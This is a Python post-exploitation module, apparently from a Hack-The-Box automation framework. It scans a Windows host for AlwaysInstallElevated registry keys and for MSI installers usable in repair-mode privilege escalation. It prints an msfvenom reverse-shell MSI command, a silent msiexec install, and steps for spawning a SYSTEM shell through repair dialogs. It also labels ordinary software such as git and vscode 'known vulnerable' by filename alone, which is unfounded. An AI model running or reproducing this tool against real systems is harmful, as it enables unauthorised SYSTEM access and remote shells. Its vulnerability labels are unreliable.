from core.module_base import ModuleBase, ModuleType, Platform
import os
import subprocess


class MSIFinder(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "msi_finder"
        self.description = "Search filesystem for MSI installers that can be used for repair-based privilege escalation"
        self.author = "HTB-Auto"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["privesc", "msi", "alwaysinstallelevated", "repair", "windows"]

        self.register_option("SEARCH_PATHS", "Comma-separated paths to search for MSI files", required=False, default="C:\\,C:\\Program Files,C:\\Program Files (x86),C:\\ProgramData,C:\\Users")
        self.register_option("MAX_DEPTH", "Maximum directory depth to search", required=False, default="5")
        self.register_option("CHECK_PERMISSIONS", "Check if MSI files are writable", required=False, default="true")
        self.register_option("CHECK_REGISTRY", "Check AlwaysInstallElevated registry keys", required=False, default="true")
        self.register_option("OUTPUT_FILE", "File to save results to", required=False, default="")
        self.register_option("KNOWN_VULNERABLE", "Only show known vulnerable applications", required=False, default="false")

        self.vulnerable_apps = [
            "pdf24",
            "anydesk",
            "teamviewer",
            "zoom",
            "vlc",
            "7-zip",
            "notepad++",
            "putty",
            "winscp",
            "filezilla",
            "gimp",
            "inkscape",
            "libreoffice",
            "openoffice",
            "foxitreader",
            "sumatrapdf",
            "irfanview",
            "paint.net",
            "audacity",
            "handbrake",
            "obs",
            "virtualbox",
            "vmware",
            "wireshark",
            "nmap",
            "python",
            "nodejs",
            "git",
            "vscode",
            "sublime",
            "atom"
        ]

    def run(self) -> bool:
        search_paths = self.get_option("SEARCH_PATHS").split(",")
        max_depth = int(self.get_option("MAX_DEPTH"))
        check_permissions = self.get_option("CHECK_PERMISSIONS").lower() == "true"
        check_registry = self.get_option("CHECK_REGISTRY").lower() == "true"
        output_file = self.get_option("OUTPUT_FILE")
        known_vulnerable_only = self.get_option("KNOWN_VULNERABLE").lower() == "true"

        self.print_status("MSI Finder - Searching for privilege escalation opportunities")
        self.print_status("=" * 60)

        results = []
        msi_files = []

        if check_registry:
            self.print_status("Checking AlwaysInstallElevated registry keys...")
            aie_result = self._check_always_install_elevated()
            if aie_result:
                results.append(aie_result)

        self.print_status(f"Searching for MSI files in: {', '.join(search_paths)}")
        self.print_status(f"Maximum search depth: {max_depth}")

        for search_path in search_paths:
            search_path = search_path.strip()
            if not search_path:
                continue

            found_files = self._search_msi_files(search_path, max_depth)
            msi_files.extend(found_files)

        if not msi_files:
            self.print_warning("No MSI files found in specified paths")
        else:
            self.print_good(f"Found {len(msi_files)} MSI file(s)")
            self.print_status("")

            for msi_path in msi_files:
                msi_info = self._analyze_msi(msi_path, check_permissions, known_vulnerable_only)
                if msi_info:
                    results.append(msi_info)

        self._print_results(results)

        if output_file:
            self._save_results(results, output_file)

        repair_candidates = [r for r in results if r.get("repair_candidate")]
        if repair_candidates:
            self.print_status("")
            self.print_good("=" * 60)
            self.print_good("POTENTIAL PRIVILEGE ESCALATION VECTORS FOUND!")
            self.print_good("=" * 60)
            self._print_exploitation_guidance(repair_candidates)
            return True
        elif results:
            self.print_warning("MSI files found but none appear exploitable for repair-based privesc")
            return True
        else:
            self.print_error("No MSI files or exploitable conditions found")
            return False

    def _check_always_install_elevated(self) -> dict:
        result = {
            "type": "registry",
            "hklm_enabled": False,
            "hkcu_enabled": False,
            "repair_candidate": False
        }

        try:
            hklm_cmd = 'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul'
            hklm_result = subprocess.run(hklm_cmd, shell=True, capture_output=True, text=True)
            if "0x1" in hklm_result.stdout:
                result["hklm_enabled"] = True
                self.print_good("[!] HKLM AlwaysInstallElevated is ENABLED!")
        except Exception as e:
            self.print_warning(f"Could not check HKLM registry: {e}")

        try:
            hkcu_cmd = 'reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul'
            hkcu_result = subprocess.run(hkcu_cmd, shell=True, capture_output=True, text=True)
            if "0x1" in hkcu_result.stdout:
                result["hkcu_enabled"] = True
                self.print_good("[!] HKCU AlwaysInstallElevated is ENABLED!")
        except Exception as e:
            self.print_warning(f"Could not check HKCU registry: {e}")

        if result["hklm_enabled"] and result["hkcu_enabled"]:
            result["repair_candidate"] = True
            self.print_good("[!!!] Both AlwaysInstallElevated keys are enabled - CRITICAL!")
            self.print_good("      Any MSI can be installed with SYSTEM privileges!")

        return result if result["hklm_enabled"] or result["hkcu_enabled"] else None

    def _search_msi_files(self, base_path: str, max_depth: int) -> list:
        msi_files = []

        if not os.path.exists(base_path):
            self.print_warning(f"Path does not exist: {base_path}")
            return msi_files

        try:
            for root, dirs, files in os.walk(base_path):
                current_depth = root.replace(base_path, "").count(os.sep)
                if current_depth >= max_depth:
                    dirs.clear()
                    continue

                skip_dirs = ["Windows\\WinSxS", "Windows\\assembly", "$Recycle.Bin", "System Volume Information"]
                dirs[:] = [d for d in dirs if not any(skip in os.path.join(root, d) for skip in skip_dirs)]

                for file in files:
                    if file.lower().endswith(".msi"):
                        full_path = os.path.join(root, file)
                        msi_files.append(full_path)

        except PermissionError:
            pass
        except Exception as e:
            self.print_warning(f"Error searching {base_path}: {e}")

        return msi_files

    def _analyze_msi(self, msi_path: str, check_permissions: bool, known_vulnerable_only: bool) -> dict:
        msi_info = {
            "type": "msi",
            "path": msi_path,
            "filename": os.path.basename(msi_path),
            "writable": False,
            "parent_writable": False,
            "known_vulnerable": False,
            "vulnerable_app": None,
            "repair_candidate": False
        }

        filename_lower = msi_info["filename"].lower()
        for app in self.vulnerable_apps:
            if app in filename_lower:
                msi_info["known_vulnerable"] = True
                msi_info["vulnerable_app"] = app
                break

        if known_vulnerable_only and not msi_info["known_vulnerable"]:
            return None

        if check_permissions:
            try:
                if os.access(msi_path, os.W_OK):
                    msi_info["writable"] = True
            except Exception:
                pass

            try:
                parent_dir = os.path.dirname(msi_path)
                if os.access(parent_dir, os.W_OK):
                    msi_info["parent_writable"] = True
            except Exception:
                pass

        if msi_info["known_vulnerable"] or msi_info["writable"] or msi_info["parent_writable"]:
            msi_info["repair_candidate"] = True

        program_files_paths = ["program files", "program files (x86)", "programdata"]
        if any(pf in msi_path.lower() for pf in program_files_paths):
            msi_info["repair_candidate"] = True

        return msi_info

    def _print_results(self, results: list):
        msi_results = [r for r in results if r.get("type") == "msi"]

        if not msi_results:
            return

        self.print_status("")
        self.print_status("MSI Files Found:")
        self.print_status("-" * 60)

        for msi in msi_results:
            status_flags = []
            if msi.get("known_vulnerable"):
                status_flags.append(f"KNOWN VULN: {msi['vulnerable_app']}")
            if msi.get("writable"):
                status_flags.append("WRITABLE")
            if msi.get("parent_writable"):
                status_flags.append("PARENT WRITABLE")
            if msi.get("repair_candidate"):
                status_flags.append("REPAIR CANDIDATE")

            if status_flags:
                self.print_good(f"[+] {msi['path']}")
                self.print_good(f"    Flags: {', '.join(status_flags)}")
            else:
                self.print_status(f"[-] {msi['path']}")

    def _print_exploitation_guidance(self, candidates: list):
        self.print_status("")
        self.print_status("Exploitation Guidance:")
        self.print_status("-" * 60)

        registry_candidates = [c for c in candidates if c.get("type") == "registry"]
        if registry_candidates:
            self.print_good("")
            self.print_good("[1] AlwaysInstallElevated Exploitation:")
            self.print_good("    Generate malicious MSI with msfvenom:")
            self.print_good("    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi")
            self.print_good("    Then install: msiexec /quiet /qn /i evil.msi")

        msi_candidates = [c for c in candidates if c.get("type") == "msi"]
        known_vuln = [c for c in msi_candidates if c.get("known_vulnerable")]

        if known_vuln:
            self.print_good("")
            self.print_good("[2] Known Vulnerable Application MSI Repair:")
            for msi in known_vuln:
                self.print_good(f"    Application: {msi['vulnerable_app']}")
                self.print_good(f"    MSI Path: {msi['path']}")
                self.print_good(f"    Exploit: msiexec /fa \"{msi['path']}\"")
                self.print_good("    This triggers repair mode which may spawn elevated processes")
                self.print_good("")

        other_msi = [c for c in msi_candidates if not c.get("known_vulnerable") and c.get("repair_candidate")]
        if other_msi:
            self.print_good("")
            self.print_good("[3] Other Potential MSI Repair Targets:")
            for msi in other_msi[:5]:
                self.print_status(f"    {msi['path']}")
            self.print_good("")
            self.print_good("    Try repair mode: msiexec /fa \"<MSI_PATH>\"")
            self.print_good("    Monitor for elevated cmd.exe or notepad.exe spawns")

        self.print_status("")
        self.print_status("General MSI Repair Privesc Steps:")
        self.print_status("1. Run: msiexec /fa \"<MSI_PATH>\" to trigger repair")
        self.print_status("2. Look for 'Open file location' or 'Help' dialogs")
        self.print_status("3. Use dialog to spawn cmd.exe or navigate to system32")
        self.print_status("4. The spawned process runs as SYSTEM")

    def _save_results(self, results: list, output_file: str):
        try:
            with open(output_file, "w") as f:
                f.write("MSI Finder Results\n")
                f.write("=" * 60 + "\n\n")

                registry_results = [r for r in results if r.get("type") == "registry"]
                if registry_results:
                    f.write("Registry Check:\n")
                    for reg in registry_results:
                        f.write(f"  HKLM AlwaysInstallElevated: {reg.get('hklm_enabled')}\n")
                        f.write(f"  HKCU AlwaysInstallElevated: {reg.get('hkcu_enabled')}\n")
                    f.write("\n")

                msi_results = [r for r in results if r.get("type") == "msi"]
                if msi_results:
                    f.write("MSI Files:\n")
                    for msi in msi_results:
                        f.write(f"  Path: {msi['path']}\n")
                        f.write(f"    Known Vulnerable: {msi.get('known_vulnerable')} ({msi.get('vulnerable_app', 'N/A')})\n")
                        f.write(f"    Writable: {msi.get('writable')}\n")
                        f.write(f"    Parent Writable: {msi.get('parent_writable')}\n")
                        f.write(f"    Repair Candidate: {msi.get('repair_candidate')}\n")
                        f.write("\n")

            self.print_good(f"Results saved to: {output_file}")
        except Exception as e:
            self.print_error(f"Failed to save results: {e}")
